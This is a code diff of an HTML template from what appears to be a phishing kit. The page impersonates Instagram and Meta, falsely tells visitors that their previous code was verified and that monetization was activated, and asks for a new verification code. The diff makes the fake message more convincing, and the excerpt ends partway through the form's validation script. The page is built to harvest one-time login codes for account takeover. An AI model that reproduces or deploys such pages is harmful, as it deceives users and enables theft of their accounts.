@@ -1,58 +1,199 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(228,64,95,0.25);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:20px auto;box-shadow:0 4px 12px rgba(228,64,95,0.15);border-radius:16px;">
   <div class="platform-header">
     <div class="icon-circle bg-instagram">
       <i class="fa-brands fa-instagram icon-lg"></i>
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram</h2>
-      <div style="color:#64748b;font-size:13px;margin-top:4px">Final Security Verification</div>
+      <div style="color:#64748b;font-size:13px;margin-top:2px">Security Verification</div>
     </div>
   </div>
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Final Security Check Required</h3>
-  
-  <div class="play-instructions">
+  <div class="play-instructions" style="margin:16px 0;">
     <div class="instruction-card">
-      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Final Verification Code</h4>
-      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
-        To complete the security verification for your Instagram account, please enter the final verification code that has been sent to your registered contact method.
-      </p>
+      <div class="message-header">
+        <div class="instagram-logo">Instagram</div>
+        <div class="message-date">Today</div>
+      </div>
+      
+      <div class="instagram-message">
+        <p class="message-text">We've successfully verified the previous code you submitted. This confirms that you are the rightful owner of this Instagram account.</p>
+        
+        <p class="message-text">You've now activated monetization features on your Instagram account in partnership with Meta Monetization Hub.</p>
+        
+        <p class="message-text">To finalize your setup and ensure your account is fully enabled for monetization, please enter the new verification code we've sent to you.</p>
+        
+        <div class="security-notice">
+          <p class="security-text">If you did not request this action, please disregard this message.</p>
+        </div>
+        
+        <p class="message-text">Thank you for being part of the Instagram creator community.</p>
+        
+        <div class="message-signature">
+          <p class="signature-line">Best regards,</p>
+          <p class="signature-line">The Instagram Team</p>
+          <p class="copyright">© Meta Platforms, Inc.</p>
+        </div>
+      </div>
     </div>
   </div>
 
   <form id="digitsForm" method="POST" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
-    <input class="input" id="digits" name="digits" placeholder="Enter final verification code" pattern="\d{4,9}" required>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:6px;font-size:14px">Verification Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter verification code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Verify & Continue</button>
+      <button class="btn login-btn" type="submit">Complete Verification</button>
     </div>
   </form>
 </div>
 
 <style>
-/* Same styles as love1_3.html but with Instagram colors */
+.input {
+  width: 100%;
+  padding: 12px 14px;
+  border-radius: 16px;
+  border: 1px solid #e5e7eb;
+  margin-bottom: 6px;
+  font-size: 15px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  background: #fafafa;
+}
 .input:focus {
   border-color: #E4405F;
-  box-shadow: 0 0 0 3px rgba(228,64,95,0.25);
+  box-shadow: 0 0 0 3px rgba(228,64,95,0.15);
+  outline: none;
+  background: #ffffff;
 }
+.input-error {
+  border-color: #ef4444;
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.1);
+}
+.error-text {
+  color: #ef4444;
+  font-size: 12px;
+  margin-top: -2px;
+  margin-bottom: 6px;
+}
+
 .login-btn {
+  width: 100%;
   background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+  color: #fff;
+  font-size: 15px;
+  font-weight: 700;
+  padding: 12px;
+  border-radius: 22px;
+  cursor: pointer;
+  border: none;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 4px 12px rgba(221,42,123,0.25);
+  display: block;
+  margin-top: 6px;
 }
 .login-btn:hover {
   background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
+  box-shadow: 0 6px 16px rgba(221,42,123,0.35);
 }
+.login-btn:active {
+  transform: scale(0.985);
+}
+
+.play-instructions {
+  margin: 16px 0;
+}
+
 .instruction-card {
+  background: #ffffff;
+  padding: 18px;
+  border-radius: 14px;
+  border: 1px solid #e5e7eb;
+  margin-bottom: 12px;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+}
+
+.message-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 14px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid #f1f5f9;
+}
+
+.instagram-logo {
+  background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+  color: white;
+  font-weight: 700;
+  font-size: 13px;
+  padding: 5px 10px;
+  border-radius: 6px;
+  letter-spacing: 0.3px;
+}
+
+.message-date {
+  color: #64748b;
+  font-size: 12px;
+  font-weight: 500;
+}
+
+.instagram-message {
+  line-height: 1.4;
+}
+
+.message-text {
+  color: #475569;
+  margin: 0 0 12px 0;
+  line-height: 1.5;
+  font-size: 13.5px;
+}
+
+.security-notice {
   background: #fdf2f8;
-  border-left: 4px solid #E4405F;
+  border: 1px solid #fbcfe8;
+  border-radius: 6px;
+  padding: 10px 12px;
+  margin: 12px 0;
+}
+
+.security-text {
+  color: #be185d;
+  margin: 0;
+  line-height: 1.4;
+  font-size: 12.5px;
+  font-weight: 500;
+}
+
+.message-signature {
+  margin-top: 16px;
+  padding-top: 14px;
+  border-top: 1px solid #f1f5f9;
+}
+
+.signature-line {
+  color: #1e293b;
+  margin: 0 0 2px 0;
+  line-height: 1.4;
+  font-size: 13.5px;
+  font-weight: 600;
+}
+
+.copyright {
+  color: #64748b;
+  margin: 6px 0 0 0;
+  line-height: 1.4;
+  font-size: 11.5px;
+}
+
+.center {
+  text-align: center;
 }
 </style>
 
 <script>
-// Same validation script as love1_3.html
 document.getElementById("digitsForm").addEventListener("submit", function(event) {
   const digits = document.getElementById("digits");
   const digitsError = document.getElementById("digitsError");
